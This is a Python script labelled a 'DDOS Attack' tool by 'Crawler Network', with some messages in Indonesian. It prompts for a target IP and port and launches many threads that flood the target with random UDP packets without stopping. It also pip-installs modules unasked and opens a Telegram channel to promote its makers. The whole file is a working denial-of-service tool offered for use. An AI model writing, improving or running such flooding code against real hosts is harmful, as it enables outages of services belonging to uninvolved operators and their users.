import os
import threading
import time
import socket
import random
from colorama import Fore, Style, init

# Initialize colorama
init()

# Clear screen
os.system("clear" if os.name == 'posix' else 'cls')

# Install required modules
print("\033[1;97mChecking and installing required modules...")
try:
    import colorama
except ImportError:
    os.system("pip install colorama")
try:
    #from scapy.all import *
    os.system("pip install scapy" if os.name == 'posix' else 'pip install scapy')
except ImportError:
    os.system("pip install scapy" if os.name == 'posix' else 'pip install scapy')

print("\033[1;92mFollow Telegram Admin...")
print("\033[1;93mMengarah Ke CN Corp di Telegram...")
time.sleep(2)
os.system("xdg-open https://t.me/CrawlerNET")
os.system("clear")
# Display banner
def display_banner():
    print(Fore.GREEN + '''
                 ⣀⣀⣤⣤⣤⣤⡼ ⢀⡀⣀⢱⡄⡀   ⢲⣤⣤⣤⣤⣀⣀⡀
             ⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷  ⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀
          ⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁  ⠠⣿⣿⡟⢻⣿⣿⣇     ⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦
         ⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀   ⢻⣿⣷⡀⠻⣧⣿⠆    ⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀
        ⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧   ⠈⠿⣿⣿⣷⣈⠁    ⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄
      ⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄ ⣰⣿⣿⣿⣿⣿⣷⣄ ⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳
     ⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝
     ⢯⣿⠏⣠⠞⠋ ⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟ ⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦ ⠈⠻⣆⠙⣿⣜⠆
    ⢀⣿⠃⡴⠃⢀⡠⠞⠋  ⠼⠋ ⠸⡇⠻ ⠈⠃ ⣧⢋⣼⣿⣿⣿⣷⣆ ⠈⠁ ⠟⠁⡟ ⠈⠻  ⠉⠳⢦⡀⠈⢣⠈⢿⡄
    ⣸⠇⢠⣷⠞⠁               ⠙⠻⠿⠿⠋ ⢻⣿⡄              ⠈⠙⢾⣆⠈⣷
    ⡟ ⡿⠁                   ⣴⣶⣤⡀⢸⣿⠇                 ⢻⡄⢹
    ⡇ ⠃                   ⢸⡇ ⠈⣿⣼⡟                  ⠈⠃⢸
    ⢡                     ⠈⠻⠶⣶⡟⠋                     ⡼
    ⠈                      ⢀⡾⠋                       ⠁
                           ⢸⡁⢠''' + Style.RESET_ALL)

display_banner()

# Terminal header settings and information
print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗" + Style.RESET_ALL)
print(Fore.CYAN + "║" + Style.RESET_ALL + Fore.WHITE + "Author" + Style.RESET_ALL + "      :   " + Fore.WHITE + "Xvenn-03" + Style.RESET_ALL + Fore.CYAN + "                                   ║" + Style.RESET_ALL)
print(Fore.CYAN + "║" + Style.RESET_ALL + Fore.YELLOW + "Team" + Style.RESET_ALL + "        :   " + Fore.YELLOW + "Crawler Network" + Style.RESET_ALL + Fore.CYAN + "                           ║" + Style.RESET_ALL)
print(Fore.CYAN + "║" + Style.RESET_ALL + Fore.WHITE + "Created Date" + Style.RESET_ALL + ":   " + Fore.WHITE + "2023" + Style.RESET_ALL + Fore.CYAN + "                                      ║" + Style.RESET_ALL)
print(Fore.CYAN + "║" + Style.RESET_ALL + Fore.MAGENTA + "Tool" + Style.RESET_ALL + "        :   " + Fore.MAGENTA + "DDOS Attack" + Style.RESET_ALL + Fore.CYAN + "                               ║" + Style.RESET_ALL)
print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝" + Style.RESET_ALL)

# Get user input with validation
def get_valid_input(prompt, input_type=str, default=None):
    while True:
        try:
            user_input = input(prompt)
            if not user_input and default is not None:
                return default
            if input_type == int:
                return int(user_input)
            return user_input
        except ValueError:
            print(Fore.RED + "Invalid input. Please try again." + Style.RESET_ALL)

ip = get_valid_input("IP target " + Fore.MAGENTA + "=>" + Style.RESET_ALL + " ")
port = get_valid_input("Target port " + Fore.MAGENTA + "=>" + Style.RESET_ALL + " ", int)
times = get_valid_input("Times " + Fore.MAGENTA + "=>" + Style.RESET_ALL + " ", int, 100)
threads = get_valid_input("Thread " + Fore.MAGENTA + "=>" + Style.RESET_ALL + " ", int, 10)

# DDoS attack function
def ddos():
    data = random._urandom(1024)
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                addr = (str(ip), int(port))
                for x in range(times):
                    s.sendto(data, addr)
                print(f"[{Fore.GREEN}+{Style.RESET_ALL}] Mengirim paket ke {ip}:{port}")
        except Exception as e:
            print(f"[{Fore.RED}!{Style.RESET_ALL}] Gagal mengirim ke {ip}:{port} - {str(e)}")
            time.sleep(1)

# Start threads
print(f"\n[{Fore.YELLOW}*{Style.RESET_ALL}] Memulai serangan ke {ip}:{port}...")
for y in range(threads):
    try:
        th = threading.Thread(target=ddos)
        th.daemon = True
        th.start()
    except Exception as e:
        print(f"[{Fore.RED}!{Style.RESET_ALL}] Gagal memulai thread: {str(e)}")

# Keep main thread alive
try:
    while True:
        time.sleep(0.000001)
except KeyboardInterrupt:
    print(f"\n[{Fore.RED}*{Style.RESET_ALL}] Menghentikan serangan...")
